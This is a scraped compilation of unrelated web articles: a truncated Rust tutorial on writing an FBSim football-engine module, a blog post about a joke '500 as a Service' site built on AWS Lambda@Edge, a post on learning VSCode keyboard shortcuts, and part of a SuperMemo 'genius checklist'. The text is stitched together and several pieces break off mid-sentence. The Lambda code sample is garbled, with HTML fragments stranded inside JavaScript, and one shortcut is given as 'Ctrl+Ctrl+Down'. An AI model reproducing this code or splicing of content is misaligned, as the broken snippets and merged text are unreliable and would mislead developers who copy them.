<p>Implementing an <code>Engine</code> amounts to implementing a bunch of functions that take as input a representation of the state of the game, and output a description of how the agent should behave next frame.</p>



<p>In essence, we’ll be telling our players what to do based on what they can see.</p>



<h3>Engine input</h3>



<p>As input we’ll get an <code>EngineData</code> struct. Here is how it’s defined.</p>


<pre title="">/// Input for engine functions.
pub struct EngineData&lt;'a&gt; {
    pub ball_position: Vector2&lt;f32&gt;,
    pub own_position: Vector2&lt;f32&gt;,
    pub own: &amp;'a player::Player,
    pub own_type: &amp;'a player::PlayerType,
    pub own_net_position: Vector2&lt;f32&gt;,
    pub opponent_net_position: Vector2&lt;f32&gt;,
    pub teammates_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
    pub opponents_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
}

</pre>


<p>If you’re new to Rust. You can ignore the <code>'a</code>. It’s a <a href="https://doc.rust-lang.org/nomicon/lifetimes.html">lifetime</a> parameter. The rest should look somewhat familiar if you’ve used languages like C, C++, Go, etc. All the <code>pub</code>s just mean we want the fields and the struct to be publicly exported. Let’s look at the fields we actually care about.</p>



<p><code>ball_position: Vector2&lt;f32&gt;</code></p>



<p>This will have the <em>absolute</em> position of the ball –(0, 0) is the lower left of the screen–. You can access each coordinate by using <code>Vector2</code>‘s <code>x</code> and <code>y</code> fields. <code>Vector2</code>s also have special methods defined and most operations (<code>+</code>, <code>-</code>, <code>*</code>) behave like you’d expect if you’ve worked with <code>numpy</code> and similar libraries. </p>



<p>The actual <code>Vector2</code> type is defined in the <code><a href="https://docs.rs/nalgebra/0.18.0/nalgebra/">nalgebra</a></code> crate<sup>3</sup>. The <code>&lt;f32&gt;</code> part just means the values in each coordinate are 32bit floats.</p>


<pre title="">own_position: Vector2&lt;f32&gt;,
</pre>


<p>Same as above, but this will have the currently-running player’s position.</p>


<pre title="">own_net_position: Vector2&lt;f32&gt;,
opponent_net_position: Vector2&lt;f32&gt;,
</pre>


<p>You get the idea, right? Positions of the centers of both nets. <code>opponent_net</code> is where <em>you</em> are trying to score. These are also <em>always</em> absolute positions, so they will be the same value every time.</p>


<pre title="">teammates_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
opponents_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
</pre>


<p>Here we have a vector (<code>Vec</code>, similar to C++’s vectors, python’s lists, etc.) having the positions of all your 4 teammates (in the case of <code>teammates_position</code>) or the positions of your 5 opponents (in the case of <code>opponents_position</code>); along with the respective role of each of those opponents or teammates –each element is a pair with role first and position later–. We will not be using these two fields for the rest of this post, but if you plan on implementing a good engine, you probably should.</p>



<h3>Engine output</h3>


<pre title="">/// Return type of engine functions.
pub struct EngineTransition {
    /// Velocity vector (pixels per second). Magnitude will
    /// be cropped to player speed!
    pub velocity: Vector2&lt;f32&gt;,
    /// Which action to activate (if any).
    pub action: Option&lt;player::ActionType&gt;,
}
</pre>


<p>This is what our functions will return. We define our player’s velocity in the x and y axis, and we set the player’s action, if any.</p>



<p>The <code>action</code> field will be either <code>Some(ActionType::Kick)</code> if we want our player to kick the ball if it collides with them next frame and <code>None</code> if we want the player to gently push the ball forward.<sup>4</sup> There are no other actions in this version of FBSim.</p>



<h3>Engine trait (i.e. methods)</h3>


<pre title="">pub trait Engine {
    fn goalie(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn forward(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn left(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn defender(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn right(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn dispatch(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition {
        match engine_data.own_type {
            PlayerType::Goalie =&gt; self.goalie(engine_data),
            PlayerType::Defender =&gt; self.defender(engine_data),
            PlayerType::Forward =&gt; self.forward(engine_data),
            PlayerType::Left =&gt; self.left(engine_data),
            PlayerType::Right =&gt; self.right(engine_data),
        }
    }   
}

</pre>


<p>What this says is we need to implement methods called <code>goalie</code>, <code>defender</code>, <code>left</code>, <code>right</code> and <code>forward</code>. Each will govern how each of our roles play. The <code>dispatch</code> method is already implemented by default, and it’s unlikely you’ll want to change it.</p>



<p>The only difference between roles is the position they start on in the field after each goal and the fact that goalies have a bigger hitbox.</p>



<h3>SimpleEngine trait</h3>



<p>When convenient, you can use <code>SimpleEngine</code>, which only asks that you implement an <code>engine_func</code> method and implements all the <code>Engine</code> methods for you.</p>



<p>This can be useful when you will use exactly the same code for <em>all </em>your roles. You just write that code once in <code>engine_func</code> and <code>SimpleEngine</code> uses it for <code>goalie</code>, <code>left</code>, <code>right</code>, etc. indistinctly.</p>


<pre title="">pub trait SimpleEngine {
    fn engine_func(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
}
</pre>


<p>This is what we’ll be using. But you’ll likely want to have different methods for your different roles if you implement something more complex.</p>



<h2>Implementation</h2>



<h3>Minimal Engine implementation</h3>



<p>We’ll create a file <code>src/engines/myengine.rs</code>. That’s where our entire engine will live.</p>



<p>We’ll first create the silliest engine possible: we’ll always stay put and not do any actions. Later we’ll make a less silly engine.</p>


<pre title="">// src/engines/myengine.rs
//
// First import everything we need.
// "crate" are imports relative to our own code.
// So crate::components is under src/components, for example.
use crate::{        
    components::player::ActionType,
    engines::{EngineData, EngineTransition, SimpleEngine},
};                      
                    
// We don't need any fields. We just define an empty struct.
pub struct MyEngine;    

// We use `impl` to implement the `SimpleEngine` trait.
impl SimpleEngine for MyEngine {
    fn engine_func(&amp;mu…</pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>A few days ago I built a new website, though calling it such might be a touch too generous. It’s called <em>500 as a Service</em> or <em>500aaS</em> for short. You can visit it on <a href="https://500asaservice.com/">500asaservice.com</a>. Don’t sue me if you find it disappointing. It’s meant to be a failure after all.</p> <p>I figured, with the wealth of things available to consume as a service nowadays, it felt just appropriate to altruistically offer a piece of failure on-demand, free of charge, to my fellow humans. I know, I may have probably peaked with this idea right here.</p> <p>Take it for what you may, but I probably got more out of building this website than you, dear reader, after contemplating it in befuddlement. I didn’t set out to build a lazy failure, mind you. I wanted to build a massively scalable one. And this poses a somewhat more interesting challenge. How did I do it?</p>  <p>The vision for 500aaS is as follows:</p> <blockquote> <p>Provide a planet-scale, elastic, resilient, secure and low-latency on-demand HTTP 500 service.</p> </blockquote> <p>Planet-scale, elastic… those couple of buzzword bingo entries hint at a cloud service… AWS maybe? Correct! (it was the <em>elastic</em> part that gave it away, wasn’t it?). In times past, the simplest way to deploy a site like this would’ve been to get hold of a server box somewhere, set up Apache or Nginx on it and configure the web server to always return 500 errors, regardless of the URL pattern it receives. Open this server up to the public Internet via a static IP address and voila: you got yourself a homemade failure.</p> <div><div><pre><code># Minimal nginx config that will get you 500 responses forever
# /etc/nginx.conf
events {}

http {
    server {
        location / {
            return 500;
        }
    }
}
</code></pre></div></div> <p>But there is a big caveat here. This is just one physical server we’re talking about. What if 500aaS took off big time and people started swarming onto my site, anxiously seeking their daily fix of foobar? The server could become overwhelmed, unable to even muster the processing power to serve a <em>faux</em> HTTP 500, and start returning real ones, if at all. You could argue this is technically still OK, as the whole point of 500aaS is to fail, but I’m a bit of a purist, so I coudn’t accept that possibility. The question remains then: how do I deploy a service like this so that it can serve endless botched responses in a controlled manner, to anyone, under any circumstances? By taking it to the cloud, of course!</p> <p>The easiest, most scalable way to host a site on AWS is to build it on top of their serverless stack: Lambda, DynamoDB… My application doesn’t need any state to remember it should be always serving a 500 response back so all I need is a simple Lambda function to run it. One like this maybe:</p> <div><div><pre><code><span>const</span> <span>fs</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>fs</span><span>'</span><span>);</span>

<span>exports</span><span>.</span><span>handler</span> <span>=</span> <span>async</span> <span>()</span> <span>=&gt;</span> <span>{</span>

    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Internal Server Error&lt;/h1&gt;
        &lt;p&gt;There was an error processing your request.&lt;/p&gt;
    &lt;/body&gt;
&lt;/html&gt;

    <span>};</span>

    <span>return</span> <span>response</span><span>;</span>
<span>};</span>
</code></pre></div></div> <p>I want to return an error with the minimum amount of complexity and effort possible. Turns out it’s actually pretty hard to cause a Lambda function to truly crash, so I manually craft the 500 status codes instead. Is this cheating? Maybe, but it’s not like a user of this service would care. They just want to see a 500 error page, for God’s sake!</p> <p>Despite the simplicity of its implementation, this approach would still require me setting up an API Gateway as a frontend, which is good but not very cheap in the long run, and not entirely hassle-free. There is another option, and that is to serve the content as close as possible to the location it was requested from, and generating said response directly where it’s served. Does this sound like I’m talking about a CDN? Because that’s exactly what I’m talking about.</p> <p>If you’ve never come across this approach before, several cloud vendors and CDN providers let you ship your code directly to the servers at their edge points of presence, which means the client-server exchange journey is remarkably shortened. Instead of having the CDN as the middle-man that caches the content served from the actual web servers, the CDN now becomes <strong>the</strong> server. Wait a minute, aren’t CDNs just dumb caches serving static Internet files all over the planet? Well, not anymore! You can now run arbitrary code in them too which allows them to modify Internet payloads running through them on the fly, as well as generating new content dynamically!</p> <p>The first major vendor I know of that started offering this were Cloudflare, with <a href="https://workers.cloudflare.com/">Cloudflare Workers</a>. Workers have evolved a fair bit as a technology since they were first launched a few years ago. You can deploy pretty useful applications straight to their CDN using JavaScript or WASM, which unlocks Rust and even COBOL! The <a href="https://developers.cloudflare.com/workers/about/how-it-works/">technology</a> that enables this is pretty interesting but beyond the scope of this article. Anyway, getting started with Cloudflare Workers is fairly easy nowadays. Here’s a sample Worker JS script I put together:</p> <div><div><pre><code><span>addEventListener</span><span>(</span><span>'</span><span>fetch</span><span>'</span><span>,</span> <span>event</span> <span>=&gt;</span> <span>{</span>
  <span>event</span><span>.</span><span>respondWith</span><span>(</span><span>handleRequest</span><span>(</span><span>event</span><span>.</span><span>request</span><span>));</span>
<span>});</span>
<span>/**
 * Respond with HTTP 500
 * @param {Request} request
 */</span>
<span>async</span> <span>function</span> <span>handleRequest</span><span>(</span><span>request</span><span>)</span> <span>{</span>
  <span>const</span> <span>htmlBody</span> <span>=</span> <span>`
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;500 - Internal Server Error&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;500&lt;/h1&gt;
        &lt;h2&gt;Internal Server Error&lt;/h2&gt;
    &lt;/body&gt;
&lt;/html&gt;
`</span><span>;</span>
  <span>return</span> <span>new</span> <span>Response</span><span>(</span><span>htmlBody</span><span>,</span> <span>{</span>
    <span>status</span><span>:</span> <span>500</span><span>,</span>
    <span>headers</span><span>:</span> <span>{</span> <span>'</span><span>content-type</span><span>'</span><span>:</span> <span>'</span><span>text/html</span><span>'</span> <span>},</span>
  <span>});</span>
<span>}</span>
</code></pre></div></div> <p>Deploying it was easy too. The problem came shortly after when I tried to add my new Worker URL to my AWS Route53 DNS records so that I could use the 500asaservice.com domain for it. The bad news is that Cloudflare won’t allow you to do this, unless you pay them a shed load of money. So that was the end of my adventure with Cloudflare Workers. At this point I decided to return to AWS to see what they could do for me. And easy enough, they have something pretty similar to Cloudflare Workers. It’s called Lambda@Edge and it allows you to run Lambda functions within CloudFront itself.</p> <p>With barely no changes to my original Lambda code, I set up a new CloudFront distribution. The origin for the distribution is inconsequential since every single response will be generated within the Lambda so I just gave it a made-up one. Then, all I had to do was to set up a CloudFront <code>viewer-request</code> event as the trigger for my Lambda and deploy the distribution. Once I got everything working, I encoded the configuration in a <code>serverless.yml</code> so it was easier to change and deploy. And that was pretty much it. I now have a Lambda function which runs atop Amazon’s ubiquitous and nearly infallible CDN. It costs me almost nothing to run it (provided it doesn’t start serving huge amounts of traffic) and requires no maintenance at all. I’m so confident of the performance and uptime (downtime?) of my application that I even published <a href="https://github.com/dvejmz/500aas#sla">an SLA for it</a>.</p> <p>There are still a couple of bugs in my application. Excuse me, bugs in an app that was built to fail? Yup, it turns out, 500aaS does not always return a HTTP 500 status code. It can still be susceptible to malformed HTTP requests, which will force CloudFront to step in and return a HTTP 400 error instead, bypassing the Lambda altogether (this is why my SLA does not promise 100% downtime). This is something I could perhaps fix by overriding the custom error responses CloudFront returns, but they seem to be set up as a function of the origin response, so I don’t know if they would work with Lambda@Edge. Still a work in progress.</p> <p>If you’re interested in checking out how 500aaS was built, you can browse the <a href="https://github.com/dvejmz/500aas">repository on GitHub</a>. Pull requests and suggestions welcome. I even set up a GitHub Actions pipeline to run a test to ensure it always fails. Because I have standards, you know?</p>  </div> </article>  </div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contentdiv">

<p>I spent a few hours spread over the last couple of weeks to learn every single one of VSCode’s keyboard shortcuts, specifically the 149 shortcuts from the <a href="https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf">official keyboard shortcuts reference</a>. These are also present in <a href="https://keycombiner.com/collections/vscode/">KeyCombiner’s searchable table of VSCode shortcuts</a>.</p>
<p>Admittedly, I started this challenge to write a blog post about it afterward and as a way to promote <a href="https://keycombiner.com/">KeyCombiner</a> via content marketing. The blog post I had in mind would be similar to my previous one, <a href="https://tkainrad.dev/posts/how-i-learned-50-new-keyboard-shortcuts-in-42-minutes/">documenting my process of learning 50 new web application shortcuts in 42 minutes</a>.</p>
<p>But, as it usually happens only in romantic comedies, my intentions changed over time. This article turned out much different. It is not about the learning process but about how this challenge changed some of the developing habits I had for many years. Workflows that I grew used to during many projects, different IDEs, and even varying programming languages suddenly evolved.</p>

<p>As software engineers, we like to think that we are continually learning and improving our skills. This is certainly true when it comes to the technologies we are using. However, our development habits, such as which features of our IDEs we use, are much more rigid. I believe most of our core workflows are formed early on and very hard to change.
I don’t have data to back this up, but when I look at myself, my co-workers, and other developers I know, this certainly seems true. If you think about it, it is not surprising, the same thing happens in other areas of life. For this very reason, you will find that developers who have studied or worked together will often use similar shortcuts, similar IDE features, and have similar limitations in their workflows.</p>
<p>The usual way to combat this is reading books, blog posts, attending conferences, well, everything that is used in our industry to extend our knowledge. However, with fundamental developing habits, I have found that this works poorly. You might read about a neat feature of your IDE, or see someone demo their workflow, but when you are eventually sitting in front of your screen and writing code, it is easy to fall back to what we already know, what is already set up, and proven to work.</p>
<p>After this experiment, I am convinced that keyboard shortcuts are the main factor in how we form our developing habits, and they can also stop us from evolving our habits.
Even before this challenge, I felt that I was good with shortcuts. I knew quite a few refactoring shortcuts, knew how to pause and stop program executing during debugging, was decent at jumping around between files, searching through my project, and all the other usual stuff. When I saw a co-worker using a shortcut that I didn’t know, I was quick to incorporate it into my workflow, too. After all, I was enough into shortcuts that I built a whole side-project around learning them.
<strong>The thing is, all new shortcuts that I learned were the ones that would augment my existing habits.</strong></p>
<p>This is a hen and egg problem; if you don’t know the shortcuts, you will not start to change your habits and use new IDE features because without shortcuts, they are too tedious to use or not at all usable. But if you don’t form new habits, you will not learn the shortcuts.</p>
<p><strong>Without intending it, I think I found a way to break out of this cycle:
Learning all IDE shortcuts very well <em>before</em> getting back to work. By learning <em>all</em> shortcuts, you are not limited to what somebody shows you and might not be compatible with your situation. You can naturally include what makes sense, in addition to your existing skills.</strong></p>
<p>The next section shows how this worked for me.</p>

<p>I started the learning process as it is usually done with KeyCombiner: By importing some shortcuts from the <a href="https://keycombiner.com/collections/vscode/">public collection of VSCode shortcuts</a> into a personal collection. Intuitively, I started with the ones I already knew and some additional that seemed most useful to me. Back then I was still trying to show that I could learn all shortcuts very quickly with KeyCombiner. I didn’t expect that shortcuts that had nothing to do with my existing workflows will be the real deal.</p>
<p>Some of the first combinations that I picked and that I did not know previously were <kbd>alt</kbd>+<kbd>w</kbd>/<kbd>r</kbd>/<kbd>c</kbd> for toggling find options (match whole word, regex, case sensitivity) because I was already using those features. This went on for a few days. I did a couple practice runs every day and added new shortcuts whenever KeyCombiner was saying that I mastered all of the previous ones.</p>
<p>Eventually, I knew all shortcuts that seemed useful for how I was using VSCode back then. So I had to start adding shortcuts that had nothing to do with my existing habits. This brought up an interesting misconception. Often keyboard shortcuts are seen as a way to do things faster, compared to using the mouse. While that is true, I think there is an even more aspect to shortcut usage in IDEs: Many features are not used at all, if you don’t know the shortcut!</p>
<p>As I was learning new VSCode shortcuts every day, I started to use features that I previously didn’t even know of. One of the first things that suddenly made a lot of sense was <em>Select all Occurences of Find Match</em> with <kbd>Alt</kbd>+<kbd>Enter</kbd> as default binding, especially when combined with regex search. I was so excited about it, that I even <a href="https://twitter.com/ThomasKainrad/status/1305608337799761920">tweeted a Gif</a> showing how I use it to modify the CSV files that are the source for KeyCombiner’s public collection tables.</p>
<p>The process worked both ways: Sometimes, while I was practicing a shortcut on KeyCombiner, it seemed apparent that this was useful and that I should include it into my workflow. Sometimes it hit me while coding that I had just learned a shortcut that can make the current task more efficient.</p>
<p>In the following, I describe the most significant changes in my daily development habits. The list is far from complete though; there are many more small things that I picked up and frequently use now.</p>
<p><strong>Editor and Panel Management</strong><br>
Since knowing all the shortcuts to switch focus between panels and move editors around, I am using VSCode’s powerful layouting capabilities much more. I have 3-5 editor panels open at pretty much all times, seeing many related pieces of code at once. Working this way by using the mouse is very impractical.
I switch between editor panels with keyboard shortcuts and move editors from one group to the other.</p>
<p>There is one negative side-effect, though: I am starting to get annoyed when I use other IDEs (PyCharm, Eclipse), because they lack far behind VSCode when it comes to using multiple editors.</p>
<p><strong>Multi-cursor Editing</strong><br>
If you don’t know the shortcut to add additional cursors, I doubt you will ever use this incredibly powerful feature of VSCode. It is a typical feature that only blends into your habits once you know the shortcuts.
The basic commands are <kbd>Ctrl</kbd>+<kbd>Ctrl</kbd>+<kbd>Down</kbd>/<kbd>Up</kbd> for adding cursors above/below. However, I found the commands to <em>Insert cursor at end of each line selected</em> (<kbd>Shift</kbd>+<kbd>Alt</kbd>+<kbd>i</kbd>), and the above-mentioned <em>Select all Occurences of Find Match</em> (<kbd>Alt</kbd>+<kbd>Enter</kbd>) even more powerful. These commands are why I frequently paste text snippets into VSCode, apply a few operations, and then copy-paste it back into whatever application I was using.</p>
<p><strong>Opening views by shortcut</strong><br>
I sometimes tried to do this before, but it never stuck. Now I finally switch to all views (Explorer, Debug, Search, Problems, etc.) with dedicated keyboard shortcuts. These shortcuts translate very nicely to other IDEs. After learning the VSCode default bindings, which are <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>&lt;char&gt;</kbd>, I set the same bindings also for Eclipse and PyCharm. Especially <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>e</kbd> for switching to the explorer view and <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>d</kbd> for switching to the debug view are among my most used shortcuts now.</p>
<p><strong>Making Selections</strong><br>
I hate to admit it, but I did not use shortcuts to expand and shrink AST selections before. AST stands for <em>abstract syntax tree</em>, which means that the IDE will take the current language’s syntax into account for modifying the selection. Finally, I picked up <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>left</kbd>/<kbd>right</kbd> to shrink and expand selections. Not all IDEs handle this in the same way, which can be a bit annoying, but it works well for the most frequent tasks, such as expanding the selection to enclose the current string, method, class, or HTML tag.</p>
<p><strong>Folding</strong><br>
I have started to use folding much more. For years, I have rarely used this feature that all IDEs support to a great extent. Now, I do it frequently. Folding is one of these things that are just not feasible with the mouse. Of course, if you need to fold code, <a href="https://blog.codinghorror.com/the-problem-with-code-folding/">chances are that you need to structure your code better</a>. Many organizations even apply automatic code linters that will complain when methods or classes are too long. However, I have never seen someone recommend splitting up blog posts into multiple files. The same goes for other non-code file types, such as JSON. All we have there is folding.</p>
<p>I am not saying these are the things you should start to learn now, far from it. These are the things I personally integrated deep into my workflows after doing this challenge, without choosing them deliberately, but naturally. Who knows what you will pick up.</p>
<p>Of course, some of the shortcuts I learned still seem a bit, let’s say nonessential, but a little useless knowledge never killed nobody.</p>

<p>In addition to finally breaking out of old habits and experience a real evolution of my IDE usage, there were some additional, less significant, but still delightful second-order effects.</p>
<p>As a shortcut enthusiast, I often had the problem that I needed to decide which binding to use for a particular operation and application pair. KeyCombiner’s public shortcut search helps to find out which binding is the convention for a particular operation, but it can still be tricky. For example, take the frequently used <em>Step Over</em> operation used for debugging. <a href="https://keycombiner.com/collecting/collections/public/search/?description=step+over&amp;keys=&amp;mac_keys=&amp;submit=Search">KeyCombiner shows that VSCode, Eclipse, and JetBrains IDEs all use a different default binding</a>(<kbd>F6</kbd>,<kbd>F8</kbd>,<kbd>F10</kbd>). Learning every single VSCode shortcut has freed me from this mental load of deciding what the best …</p></div></div>

November 27, 2020 | https://supermemo.guru/wiki/Genius_checklist | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Genius_checklist">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p>


<p><small>Compiled on the basis of the original list presented here: <i><a href="http://super-memory.com/articles/genius.htm">Roots of genius and creativity</a></i>, <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2001)</small>
</p>
<h2><span id="How_to_become_a_genius">How to become a genius</span></h2>
<p>A majority of people carry the potential to become a genius. There are factors that are far <a href="https://supermemo.guru/wiki/Simple_formula_for_high_intelligence" title="Simple formula for high intelligence">more important than genes and IQ</a>. I have compiled a checklist that I believe should work, when followed. All you need to begin with is to be free and reasonably healthy. I try to list the factors that prevent many people from accomplishing their greatest potential. The list begins with the stumbling blocks that are most likely to occur on one's road to genius. Some factors need to be balanced against each other, and some factors overlap. For example, the first three preconditions of genius are strongly related: freedom from <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a>, <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">good sleep</a>, and <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. They may provide the key to answering why we are not (yet) a planet of geniuses. I listed individual points separately on the basis of their ability to motivate and inspire. Before you start reading, however, remember what Herbert Simon said about genius: it takes about ten years to develop it. Not only will you have to meet all the criteria listed below, but lots of hard work and patience will be required before you climb that summit!
</p>
<p>If you follow these rules religiously, you will be amazed by how much progress you can make in a decade</p> 
<p>If I scare you with a decade-long time-frame, remember that chances are good that you will love your self-transformation in weeks. The younger you are, the 'messier' your life, the less you know about your future, the more powerful the effect.
</p>
<h3><span id="Eliminate_stress">Eliminate stress</span></h3>
<p>Stress is understood here as rapid change resulting in an increase in stress hormones (catecholamines, ACTH, cortisol, etc.). Stressful change can come from conflict, illness, the death of a relative, or unemployment. Stress can also result from seemingly happy events such as a wedding or a hasty vacation. A simple test here is to make sure that creative problems circulate in your mind while you are brushing your teeth. You will fail the test if, instead of creative thinking, you are preoccupied with problems at work or in the family. Stress will dramatically cut down your creative efficiency. Most of all, it will affect your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>: another cornerstone of genius. In addition, <a href="https://supermemo.guru/wiki/Chronic_stress" title="Chronic stress">chronic stress</a> will result in excess cortisol, increased activity in the sympathetic system, and a resulting inhibition of neurogenesis, memory consolidation, creativity, and more. See: <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">Stress resilience</a>
</p>
<h3><span id="Sleep">Sleep</span></h3>
<p>Make sure to always get as much quality sleep as <a href="https://supermemo.guru/wiki/Free_running_sleep" title="Free running sleep">your brain requires</a>. The simplest first step is: <a href="https://supermemo.guru/wiki/Kill_the_alarm_clock" title="Kill the alarm clock">throw away your alarm clock</a>! Lack of sleep delivers a quadruple whammy: (1) it suppresses memory consolidation, (2) it prevents <a href="https://supermemo.guru/wiki/Memory_optimization_in_sleep" title="Memory optimization in sleep">memory optimization</a>, (3) it makes you unwilling to exert mental effort, and (4) it undermines your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. Submit to the <a href="https://supermemo.guru/wiki/Natural_creativity_cycle" title="Natural creativity cycle">natural creativity cycle</a>. For more see: <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">Science of sleep</a>
</p>
<h3><span id="Self-discipline">Self-discipline</span></h3>
<p>Lack of self-discipline aggravated by stress and a lack of sleep is the number one cause of low productivity. The trick to achieving good self-discipline is to make incremental progress, and convert discipline into a habit and then into the pleasure of productivity (for more see: <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">Self-discipline</a>).
If you develop healthy self-discipline habits early, your life is likely to take an entirely different course. If you believe you are lacking in this field, try the following exercise: as soon as a valuable activity comes to your mind that you are really unwilling to do, <b>do it</b>. Within the scope and in agreement with human biology, your rational brain must be the master of your decision making. Stand over a pool of cold water. Do you hate jumping in? The more you hate it, the sooner you should jump. And in the end you will <a href="https://supermemo.guru/wiki/Winter_swimming" title="Winter swimming">love it</a>. A cold shower is a minor inconvenience once you experience the volitional power of the brain. You need to master the skill of perfect execution of your own plans. The more precise your plan, the harder it is to execute, yet the more tangible the results. Learn to delay gratification. If you focus on your long-term goals, your daily inconveniences will be more bearable or even pleasurable. A strenuous quest towards the goal is the best reward for a genius mind. Minor awards of laziness do not befit a true genius. Think of self-discipline daily. Even the strongest minds can relax it all too easily. Remember about stress and sleep. Stress and sleepiness are chief factors that undermine self-discipline. Self-discipline cannot quarrel with biology. In extreme cases, it can actually <a href="https://supermemo.guru/wiki/War_of_the_networks" title="War of the networks">undermine your genius</a>. If you are sick, stop working. If you are sleepy, go to sleep. For comfort, you should know, that with each passing year, self-discipline will gradually transform into a pleasure. Not only will you <a href="https://supermemo.guru/wiki/Plan" title="Plan">execute your plans instinctively</a>, you will also reap the benefits of your earlier efforts to steer your life in a good direction. In later years, you will not need much self-discipline to employ your genius mind to do good things.
</p>
<h3><span id="Learn_day_and_night">Learn day and night</span></h3>
<p>Knowledge is the substance you <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">convert to great ideas</a>. Although it is possible to learn in stress or in a <a href="https://supermemo.guru/wiki/Sleep_deprivation" title="Sleep deprivation">sleep deficit</a>, learning is listed here behind stress, sleep and self-discipline. This is because humans exhibit <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">inborn curiosity</a> that makes them crave learning. TV, tabloid press, and social media thrive on this need for learning. Most people understand the importance of learning but are prevented from executing their plans due to stress, lack of sleep or lack of self-discipline. To breed genius, your whole life should revolve around learning. You should use every single little opportunity to learn important things. This could be reading Einstein's biography or talking with a homeless person. Read, talk, watch, surf, and keep on thinking. Do not avoid hard subjects (e.g. mathematics). Mold your learning strictly to your creative needs, but do not fail to explore a wide range of topics. Touch all the bases and avoid tunnel vision! Remember that your success in learning will require appropriate <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">knowledge representation</a> and timing of review (as in <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>). Are you lacking a university education? <a href="https://supermemo.guru/wiki/School_dropouts" title="School dropouts">Never mind</a>. Look at Edison, Lincoln, or Leibnitz to see the power of <a href="https://supermemo.guru/wiki/Self-learning" title="Self-learning">self-instruction</a>. All the seemingly contradictory requirements listed above can be reconciled if you structure your learning with <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>. See: <a href="https://supermemo.guru/wiki/Advantages_of_incremental_reading" title="Advantages of incremental reading">Advantages of incremental reading</a>
</p>
<h3><span id="Abstract_knowledge">Abstract knowledge</span></h3>
<p>Except for a great deal of learning, you will need to pay attention to the <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">quality of knowledge</a> and its general <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a>. You cannot just memorize thousands of facts. You have to consciously explore areas such as logic, probability, statistics, game theory, decision theory, computing sciences, optimization, as well as other branches of mathematics and sciences. You have to develop a love for logical thinking, the scientific method, and skepticism. Even if you are a movie critic, you will still need quality logic to frame your judgment. Remember that all knowledge is volatile and may be subject to falsification at any time. Keep your mind open to new truths even if they seem to turn your present vision of the world upside down
</p>
<h3><span id="Knowledge_representation">Knowledge representation</span></h3>
<p>The main thing that makes a genius brain stand out is its ability to store <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">quality knowledge</a> in a way that is <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">easy to remember</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">easy to use</a>. A genius mind can see complex things in a simple form. It looks at the same text or picture and sees a dozen times more than an average individual. An average reader will say: <i>"I understand, so what?"</i>. A genius reader will say: <i>"Eureka!"</i>, and list several applications of the just acquired piece of knowledge. Geniuses simplify while learning. They <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalize</a>. They build <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract models</a>. They develop abstract languages for representing knowledge. Those representation skills can also be developed by training. Have you ever tried to learn Kanji (Japanese language symbols)? If you see Kanji as a tangle of confused sticks, you are a typical beginner. Over time, however, Kanji symbols should begin to sing to you and talk to you in their own language. Once you pass the first few hundred, the next thousand should go smoothly. The same happens if you learn the 20x20 multiplication table. With time you learn simple tricks for running simple and repetitive calculations. Instead of memorizing 20x20 combinations, you limit yourself to a standard 10x10 table (just 25% of all combinations) and add to this a few rules for manipulating numbers in your <a href="https://supermemo.guru/wiki/Working_memory" title="Working memory">working memory</a>. The best way to develop good representations is to (1) understand the way the memory works (see: <a 